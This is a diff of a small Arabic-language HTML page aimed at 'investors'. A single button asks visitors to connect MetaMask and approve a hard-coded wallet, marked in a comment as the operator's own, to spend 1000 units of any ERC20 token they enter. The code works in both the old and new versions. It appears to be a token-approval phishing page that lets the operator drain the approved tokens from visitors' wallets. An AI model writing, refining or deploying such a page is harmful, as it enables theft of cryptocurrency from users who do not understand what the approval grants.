@@ -1,71 +1,68 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>تفعيل Approve للمستثمر</title>
+  <title>Approve 1000</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js"></script>
 </head>
 <body>
-  <h2>أدخل عنوان  ERC20</h2>
-  <input type="text" id="tokenAddress" placeholder="مثال: 0xdAC17F958D2ee523a2206206994597C13D831ec7" style="width: 400px;" />
-  <br /><br />
+  <h2>المستثمرين - الموافقة على سحب 1000 من التوكن</h2>
+  <label>أدخل عنوان التوكن ERC20:</label><br>
+  <input type="text" id="tokenAddress" placeholder="0x..." style="width:300px" />
+  <br><br>
   <button id="approveBtn">اعمل Approve 1000</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
- <script>
-  const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // محفظتك
+  <script>
+    const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // محفظتك
 
-  const erc20Abi = [
-    "function approve(address spender, uint256 amount) public returns (bool)",
-    "function decimals() view returns (uint8)",
-  ];
+    const erc20Abi = [
+      "function approve(address spender, uint256 amount) public returns (bool)",
+      "function decimals() view returns (uint8)"
+    ];
 
-  let isProcessing = false;
+    let isProcessing = false;
 
-  async function approve() {
-    if (isProcessing) {
-      alert("يرجى الانتظار... المعالجة جارية.");
-      return;
-    }
-
-    isProcessing = true;
-
-    try {
-      if (!window.ethereum) {
-        alert("يرجى تثبيت MetaMask.");
+    async function approve() {
+      if (isProcessing) {
+        alert("جاري الاتصال بالمحفظة، يرجى الانتظار...");
         return;
       }
 
-      const tokenAddress = document.getElementById("tokenAddress").value.trim();
-      if (!ethers.isAddress(tokenAddress)) {
-        alert("عنوان التوكن غير صالح!");
-        return;
+      isProcessing = true;
+
+      try {
+        if (!window.ethereum) {
+          alert("يرجى تثبيت MetaMask أولاً.");
+          return;
+        }
+
+        const tokenAddress = document.getElementById("tokenAddress").value.trim();
+        if (!ethers.isAddress(tokenAddress)) {
+          alert("عنوان التوكن غير صالح!");
+          return;
+        }
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+
+        const token = new ethers.Contract(tokenAddress, erc20Abi, signer);
+        const decimals = await token.decimals();
+        const amount = ethers.parseUnits("1000", decimals);
+
+        const tx = await token.approve(spenderAddress, amount);
+        alert("تم إرسال المعاملة! Hash: " + tx.hash);
+
+        await tx.wait();
+        alert("✅ تمت الموافقة بنجاح!");
+      } catch (error) {
+        console.error(error);
+        alert("حدث خطأ: " + (error?.message || "غير معروف"));
+      } finally {
+        isProcessing = false;
       }
-
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-
-      const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
-      const decimals = await tokenContract.decimals();
-
-      const amount = ethers.parseUnits("1000", decimals);
-
-      const tx = await tokenContract.approve(spenderAddress, amount);
-      alert("تم إرسال العملية. Hash: " + tx.hash);
-
-      await tx.wait();
-      alert("تمت الموافقة بنجاح!");
-    } catch (error) {
-      console.error(error);
-      alert("حدث خطأ: " + error.message);
-    } finally {
-      isProcessing = false;
     }
-  }
 
-  document.getElementById("approveBtn").addEventListener("click", approve);
-</script>
-
+    document.getElementById("approveBtn").addEventListener("click", approve);
+  </script>
 </body>
 </html>
